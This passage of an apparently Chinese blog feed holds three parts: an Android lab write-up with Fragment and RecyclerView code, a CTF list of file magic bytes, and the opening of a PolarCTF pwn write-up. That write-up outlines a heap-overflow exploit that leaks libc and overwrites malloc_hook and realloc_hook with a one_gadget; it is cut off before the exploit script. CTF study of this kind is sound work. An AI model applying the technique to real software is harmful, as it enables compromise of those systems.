Inflate the layout for this fragment</span><br>    <span class="hljs-comment">//return inflater.inflate(R.layout.fragment_lt, container, false);</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>分析代码</p><p>初始化列表内容</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initData</span><span class="hljs-params">()</span>{<br>        list.add(<span class="hljs-string">"网友1:青青园中葵"</span>);<br>        list.add(<span class="hljs-string">"网友2:朝露待日晞"</span>);<br>        list.add(<span class="hljs-string">"网友3:阳春布德泽"</span>);<br>        list.add(<span class="hljs-string">"网友4:万物生光辉"</span>);<br>        list.add(<span class="hljs-string">"网友5:常恐秋节至"</span>);<br>        list.add(<span class="hljs-string">"网友6:焜黄华叶衰"</span>);<br>        list.add(<span class="hljs-string">"网友7:百川东到海"</span>);<br>        list.add(<span class="hljs-string">"网友8:何时复西归"</span>);<br>        list.add(<span class="hljs-string">"网友9:少壮不努力"</span>);<br>        list.add(<span class="hljs-string">"网友10:老大徒伤悲"</span>);<br>    }<br></code></pre></td></tr></tbody></table></figure><p>创建一个<code>LinearLayoutManager</code>对象，并将其赋值给<code>manager</code>变量。然后通过调用<code>setOrientation(LinearLayoutManager.VERTICAL)</code>方法，将布局方向设置为垂直方向。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">LinearLayoutManager manager=<span class="hljs-keyword">new</span> <span class="hljs-title class_">LinearLayoutManager</span>(context);<br>    manager.setOrientation(LinearLayoutManager.VERTICAL);<br></code></pre></td></tr></tbody></table></figure><p><code>myadapter = new Myadapter(context, list);</code> 创建一个名为<code>myadapter</code>的自定义适配器对象，并传入<code>context</code>和<code>list</code>作为参数进行初始化。</p><p>recyclerView.setAdapter(myadapter);<code> 将创建的适配器对象</code>myadapter<code>设置给</code>recyclerView<code>，用于显示数据。</code>recyclerView.setLayoutManager(manager);<code> 将之前创建的布局管理器</code>manager<code>设置给</code>recyclerView，用于控制列表的布局方式。</p><p>return view;<code> 返回包含</code>recyclerView的视图对象。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">myadapter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myadapter</span>(context,list);<br><br>    recyclerView.setAdapter(myadapter);<br>    recyclerView.setLayoutManager(manager);<br>    recyclerView.addItemDecoration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DividerItemDecoration</span>(context,LinearLayoutManager.VERTICAL));<br>    <span class="hljs-keyword">return</span> view;<br></code></pre></td></tr></tbody></table></figure><h4 id="ltfragment全部代码展示"><a href="#ltfragment全部代码展示" class="headerlink" title="ltfragment全部代码展示"></a>ltfragment全部代码展示</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mywork;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.DividerItemDecoration;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.LinearLayoutManager;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.RecyclerView;<br><br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A simple {<span class="hljs-doctag">@link</span> Fragment} subclass.</span><br><span class="hljs-comment"> * Use the {<span class="hljs-doctag">@link</span> ltFragment#newInstance} factory method to</span><br><span class="hljs-comment"> * create an instance of this fragment.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ltFragment</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fragment</span> {<br><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Rename parameter arguments, choose names that match</span><br>    <span class="hljs-comment">// the fragment initialization parameters, e.g. ARG_ITEM_NUMBER</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ARG_PARAM1</span> <span class="hljs-operator">=</span> <span class="hljs-string">"param1"</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ARG_PARAM2</span> <span class="hljs-operator">=</span> <span class="hljs-string">"param2"</span>;<br><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Rename and change types of parameters</span><br>    <span class="hljs-keyword">private</span> String mParam1;<br>    <span class="hljs-keyword">private</span> String mParam2;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Use this factory method to create a new instance of</span><br><span class="hljs-comment">     * this fragment using the provided parameters.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> param1 Parameter 1.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> param2 Parameter 2.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> A new instance of fragment ltFragment.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Rename and change types and number of parameters</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ltFragment <span class="hljs-title function_">newInstance</span><span class="hljs-params">(String param1, String param2)</span> {<br>        <span class="hljs-type">ltFragment</span> <span class="hljs-variable">fragment</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ltFragment</span>();<br>        <span class="hljs-type">Bundle</span> <span class="hljs-variable">args</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bundle</span>();<br>        args.putString(ARG_PARAM1, param1);<br>        args.putString(ARG_PARAM2, param2);<br>        fragment.setArguments(args);<br>        <span class="hljs-keyword">return</span> fragment;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ltFragment</span><span class="hljs-params">()</span> {<br>        <span class="hljs-comment">// Required empty public constructor</span><br>    }<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        <span class="hljs-keyword">if</span> (getArguments() != <span class="hljs-literal">null</span>) {<br>            mParam1 = getArguments().getString(ARG_PARAM1);<br>            mParam2 = getArguments().getString(ARG_PARAM2);<br>        }<br>    }<br><br>    <span class="hljs-keyword">private</span> RecyclerView recyclerView;<br>    <span class="hljs-keyword">private</span> List&lt;String&gt; list;<br>    <span class="hljs-keyword">private</span> Context context;<br>    <span class="hljs-keyword">private</span> Myadapter myadapter;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> View <span class="hljs-title function_">onCreateView</span><span class="hljs-params">(LayoutInflater inflater, ViewGroup container,</span><br><span class="hljs-params">                             Bundle savedInstanceState)</span> {<br>        View view=inflater.inflate(R.layout.fragment_lt,container,<span class="hljs-literal">false</span>);<br>        context=view.getContext();<br>        recyclerView=view.findViewById(R.id.recyclerview);<br>        list=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        initData();<br><br>        LinearLayoutManager manager=<span class="hljs-keyword">new</span> <span class="hljs-title class_">LinearLayoutManager</span>(context);<br><br>        manager.setOrientation(LinearLayoutManager.VERTICAL);<br><br>        myadapter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myadapter</span>(context,list);<br><br>        recyclerView.setAdapter(myadapter);<br><br>        recyclerView.setLayoutManager(manager);<br><br><br>        recyclerView.addItemDecoration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DividerItemDecoration</span>(context,LinearLayoutManager.VERTICAL));<br>        <span class="hljs-keyword">return</span> view;<br><br>        <span class="hljs-comment">// Inflate the layout for this fragment</span><br>        <span class="hljs-comment">//return inflater.inflate(R.layout.fragment_lt, container, false);</span><br>    }<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initData</span><span class="hljs-params">()</span>{<br>        list.add(<span class="hljs-string">"网友1:青青园中葵"</span>);<br>        list.add(<span class="hljs-string">"网友2:朝露待日晞"</span>);<br>        list.add(<span class="hljs-string">"网友3:阳春布德泽"</span>);<br>        list.add(<span class="hljs-string">"网友4:万物生光辉"</span>);<br>        list.add(<span class="hljs-string">"网友5:常恐秋节至"</span>);<br>        list.add(<span class="hljs-string">"网友6:焜黄华叶衰"</span>);<br>        list.add(<span class="hljs-string">"网友7:百川东到海"</span>);<br>        list.add(<span class="hljs-string">"网友8:何时复西归"</span>);<br>        list.add(<span class="hljs-string">"网友9:少壮不努力"</span>);<br>        list.add(<span class="hljs-string">"网友10:老大徒伤悲"</span>);<br>    }<br><br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="MainActivity-java全部内容展示"><a href="#MainActivity-java全部内容展示" class="headerlink" title="MainActivity-java全部内容展示"></a>MainActivity.java全部内容展示</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mywork;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-keyword">import</span> androidx.fragment.app.FragmentManager;<br><span class="hljs-keyword">import</span> androidx.fragment.app.FragmentTransaction;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.LinearLayoutManager;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.RecyclerView;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.LinearLayout;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">View</span>.OnClickListener{<br>    Fragment fragment1,fragment2,fragment3,fragment4;<br>    FragmentManager fm;<br>    LinearLayout linearLayout1,linearLayout2,linearLayout3,linearLayout4;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.main);<br>        fragment1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ltFragment</span>();<br>        fragment2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">txlFragment</span>();<br>        fragment3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">findFragment</span>();<br>        fragment4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">wdFragment</span>();<br>        fm = getSupportFragmentManager();<br><br>        linearLayout1 = findViewById(R.id.id_tab_wx);<br>        linearLayout2 = findViewById(R.id.id_tab_friend);<br>        linearLayout3 = findViewById(R.id.id_tab_address);<br>        linearLayout4 = findViewById(R.id.id_tab_setting);<br><br>        inital();<br>        fragmenthide();<br>        fragmentshow(fragment1);<br>        linearLayout1.setOnClickListener(<span class="hljs-built_in">this</span>);<br>        linearLayout2.setOnClickListener(<span class="hljs-built_in">this</span>);<br>        linearLayout3.setOnClickListener(<span class="hljs-built_in">this</span>);<br>        linearLayout4.setOnClickListener(<span class="hljs-built_in">this</span>);<br>    }<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fragmenthide</span><span class="hljs-params">()</span> {<br>        <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>                .hide(fragment1)<br>                .hide(fragment2)<br>                .hide(fragment3)<br>                .hide(fragment4);<br>        ft.commit();<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">inital</span><span class="hljs-params">()</span> {<br><br>        <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>                .add(R.id.content,fragment1)<br>                .add(R.id.content,fragment2)<br>                .add(R.id.content,fragment3)<br>                .add(R.id.content,fragment4);<br>        ft.commit();<br><br>    }<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view)</span> {<br>        fragmenthide();<br>        <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_wx){<br>            fragmentshow(fragment1);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_friend){<br>            fragmentshow(fragment2);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_address){<br>            fragmentshow(fragment3);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(view.getId()==R.id.id_tab_setting){<br>            fragmentshow(fragment4);<br>        }<br>    }<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fragmentshow</span><span class="hljs-params">(Fragment fragment)</span> {<br>        <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>                .show(fragment);<br>        transaction.commit();<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p class='item-img' data-src='https://s2.loli.net/2023/10/13/XFIxLtsQfOSbnVc.png'><img src="https://s2.loli.net/2023/10/13/XFIxLtsQfOSbnVc.png" alt="image.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/10/13/pZ5ct8yXLPAS3Nw.png'><img src="https://s2.loli.net/2023/10/13/pZ5ct8yXLPAS3Nw.png" alt="image.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/82PfDyF6CNcqAp9.png'><img src="https://s2.loli.net/2023/10/07/82PfDyF6CNcqAp9.png" alt="Snipaste_2023-10-07_21-10-09.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/ty19qzgMbTcK4l5.png'><img src="https://s2.loli.net/2023/10/07/ty19qzgMbTcK4l5.png" alt="Snipaste_2023-10-07_21-10-13.png"></p><h2 id="代码仓库"><a href="#代码仓库" class="headerlink" title="代码仓库"></a>代码仓库</h2><p>[<a href="https://github.com/Kylinxin/MyWork">Kylinxin/MyWork: 类微信界面源代码 (github.com)</a>](<a href="https://github.com/Kylinxin/MyWork">https://github.com/Kylinxin/MyWork</a>)</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是我第一次利用as进行移动开发实现了一个简单的类微信的界面设计，加强了我对as的fragment、基本layout、recycleview的认知，以及对xml文件进行界面编写部分以及对相关的控件有了更深入的了解，能够设计基础UI界面，实现界面跳转功能以及在fragment里面调用recycleview实现列表功能，给我提供了一定的思路进行功能和界面相互连接的代码的编写。在这次的实验下我也对AS这款软件进行了熟悉，对于其提词器的强大有了很深的印象。</p><p>​——2023.10.13</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;AS类微信界面开发&lt;/h1&gt;
&lt;h2 id=&quot;功能要求&quot;&gt;&lt;a href=&quot;#功能要求&quot; class=&quot;headerlink&quot; title=&quot;功能要求&quot;&gt;&lt;/a&gt;功能要求&lt;/h2&gt;
&lt;p&gt;1.、请根据课程内容设计一个app的门户框架，需要实现3-4个tab切换效果；本功能</summary>
      
    
    
    
    <category term="实验" scheme="https://kylinxin.github.io/categories/%E5%AE%9E%E9%AA%8C/"/>
    
    
    <category term="移动开发实验" scheme="https://kylinxin.github.io/tags/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>常见文件文件头和隐写术总结 CTF中Misc必备</title>
    <link href="https://kylinxin.github.io/2023/09/27/Misc%20%E7%AC%94%E8%AE%B0/"/>
    <id>https://kylinxin.github.io/2023/09/27/Misc%20%E7%AC%94%E8%AE%B0/</id>
    <published>2023-09-27T15:14:29.000Z</published>
    <updated>2023-09-30T09:14:29.172Z</updated>
    
    <content type="html"><![CDATA[<h1>Misc</h1><h2 id="常见文件文件头和隐写术总结-CTF中Misc必备"><a href="#常见文件文件头和隐写术总结-CTF中Misc必备" class="headerlink" title="常见文件文件头和隐写术总结-CTF中Misc必备"></a><strong>常见文件文件头和隐写术总结 CTF中Misc必备</strong></h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>对常见文件文件头和隐写术做个归纳总结</p><ul><li>文件头文件尾</li><li>图片隐写</li><li>音频隐写</li><li>电子文档隐写</li></ul><h3 id="一、文件头文件尾"><a href="#一、文件头文件尾" class="headerlink" title="一、文件头文件尾"></a><strong>一、文件头文件尾</strong></h3><h4 id="1、图片"><a href="#1、图片" class="headerlink" title="1、图片"></a><strong>1、图片</strong></h4><ul><li>JPEG 文件头：<code>FF D8 FF</code>  文件尾：<code>FF D9</code></li><li>TGA 未压缩的前4字节 <code>00 00 02 00</code> RLE压缩的前5字节 <code>00 00 10 00 00</code></li><li>PNG 文件头：<code>89 50 4E 47 0D 0A 1A 0A</code>  文件尾：<code>AE 42 60 82</code></li><li>GIF 文件头：<code>47 49 46 38 39(37) 61</code>  文件尾：<code>00 3B</code></li><li>BMP 文件头：<code>42 4D</code> 文件头标识(2 bytes) 42(B) 4D(M)</li><li>TIFF (tif) 文件头：<code>49 49 2A 00</code></li><li>ico 文件头：<code>00 00 01 00</code></li><li>Adobe Photoshop (psd) 文件头：<code>38 42 50 53</code></li></ul><h4 id="2、office文件"><a href="#2、office文件" class="headerlink" title="2、office文件"></a><strong>2、office文件</strong></h4><ul><li>MS Word/Excel (xls.or.doc) 文件头：<code>D0 CF 11 E0</code></li><li>MS Access (mdb) 文件头：<code>53 74 61 6E 64 61 72 64 20 4A</code></li><li>WordPerfect (wpd) 文件头：<code>FF 57 50 43</code></li><li>Adobe Acrobat (pdf) 文件头：<code>25 50 44 46 2D 31 2E</code></li><li>application/vnd.visio(vsd) 文件头：<code>D0 CF 11 E0 A1 B1 1A E1</code></li><li>Email [thorough only] (eml) 文件头：<code>44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A</code></li><li>Outlook Express (dbx) 文件头：<code>CF AD 12 FE C5 FD 74 6F</code></li><li>Outlook (pst) 文件头：<code>21 42 44 4E</code></li><li>Rich Text Format (rtf) 文件头：<code>7B 5C 72 74 66</code></li><li>txt 文件(txt) 文件头：Unicode：<code>FE FF</code> / Unicode big endian：<code>FF FE</code> / UTF-8：<code>EF BB BF</code> /ANSI编码是没有文件头的</li></ul><h4 id="3、压缩包文件"><a href="#3、压缩包文件" class="headerlink" title="3、压缩包文件"></a><strong>3、压缩包文件</strong></h4><ul><li>ZIP Archive (zip) 文件头：<code>50 4B 03 04</code> 文件尾：<code>50 4B</code></li><li>RAR Archive (rar) 文件头：<code>52 61 72 21</code></li></ul><h4 id="4、音频文件"><a href="#4、音频文件" class="headerlink" title="4、音频文件"></a><strong>4、音频文件</strong></h4><ul><li>Wave (wav) 文件头：<code>57 41 56 45</code></li><li>audio(Audio) 文件头： <code>4D 54 68 64</code></li><li>audio/x-aac（aac）</li><li>文件头：<code>FF F1(9)</code></li></ul><h4 id="5、视频文件"><a href="#5、视频文件" class="headerlink" title="5、视频文件"></a><strong>5、视频文件</strong></h4><ul><li>AVI (avi) 文件头：<code>41 56 49 20</code></li><li>Real Audio (ram) 文件头：<code>2E 72 61 FD</code></li><li>Real Media (rm) 文件头：<code>2E 52 4D 46</code></li><li>MPEG (mpg) 文件头：<code>00 00 01 BA(3)</code></li><li>Quicktime (mov) 文件头：<code>6D 6F 6F 76</code></li><li>Windows Media (asf) 文件头：<code>30 26 B2 75 8E 66 CF 11</code></li><li>MIDI (mid) 文件头：<code>4D 54 68 64</code></li></ul><h4 id="6、代码文件"><a href="#6、代码文件" class="headerlink" title="6、代码文件"></a><strong>6、代码文件</strong></h4><ul><li>XML (xml) 文件头：<code>3C 3F 78 6D 6C</code></li><li>HTML (html) 文件头：<code>68 74 6D 6C 3E</code></li><li>Quicken (qdf) 文件头：<code>AC 9E BD 8F</code></li><li>Windows Password (pwl) 文件头：<code>E3 82 85 96</code></li></ul><h4 id="7、其他类型"><a href="#7、其他类型" class="headerlink" title="7、其他类型"></a><strong>7、其他类型</strong></h4><ul><li>windows证书文件(der) 文件头：<code>30 82 03 C9</code></li><li>CAD (dwg) 文件头：<code>41 43 31 30</code></li><li>Windows Shortcut (lnk) 文件头：<code>4C 00 00 00</code></li><li>Windows reg(reg) 文件头：<code>52 45 47 45 44 49 54 34</code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Misc&lt;/h1&gt;
&lt;h2 id=&quot;常见文件文件头和隐写术总结-CTF中Misc必备&quot;&gt;&lt;a href=&quot;#常见文件文件头和隐写术总结-CTF中Misc必备&quot; class=&quot;headerlink&quot; title=&quot;常见文件文件头和隐写术总结-CTF中Misc必备&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="Misc" scheme="https://kylinxin.github.io/categories/Misc/"/>
    
    
    <category term="misc" scheme="https://kylinxin.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>PolarCTF_2023_wp</title>
    <link href="https://kylinxin.github.io/2023/09/27/PolarCTF_2023_wp/"/>
    <id>https://kylinxin.github.io/2023/09/27/PolarCTF_2023_wp/</id>
    <published>2023-09-27T15:14:29.000Z</published>
    <updated>2023-09-30T09:10:52.078Z</updated>
    
    <content type="html"><![CDATA[<h1>PWN</h1><blockquote><p>记录一下 一次比赛的复盘，除了夕阳下的舞者有点难度之外，其他题目难度还适中，最后也是拿到了不错的排名！期待12月份的Polar D&amp;N的冬季赛！</p></blockquote><p class='item-img' data-src='https://s2.loli.net/2023/09/30/ENZdsnHgIiDKFzQ.png'><img src="https://s2.loli.net/2023/09/30/ENZdsnHgIiDKFzQ.png" alt="image.png"></p><p>最后每道题目都有官方视频讲解，链接 <a href="https://www.bilibili.com/video/BV1fr4y1Z73F?p=1&amp;vd_source=5c5a710dfdccbb5b7b821586612058bd">【PWN】小狗汪汪汪_哔哩哔哩_bilibili</a></p><h2 id="emo-chunk"><a href="#emo-chunk" class="headerlink" title="emo-chunk"></a>emo_chunk</h2><h3 id="程序保护"><a href="#程序保护" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ul><li>堆溢出，可以通过溢出chunk内容，从而修改下一个chunk的size字段，制造堆块重叠，将下一个chunk大小改为small chunk，这样free掉之后，会放入unsortedbin中，fd和bk都指向main_arena_88</li><li>然后可以通过打印函数泄露libc地址</li><li>利用fastbin的特性，向malloc_hook-0x23的位置申请chunk，覆写malloc_hook</li></ul><blockquote><p>注意一般思路是这样的，但是题目具体要使用realloc_hook来进行调栈，具体操作为改realloc_hook为onegadget，malloc_hook为realloc_hook，这样执行malloc时，会实现二级跳。malloc_hook -&gt; realloc_hook -&gt; onegadget</p></blockquote><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 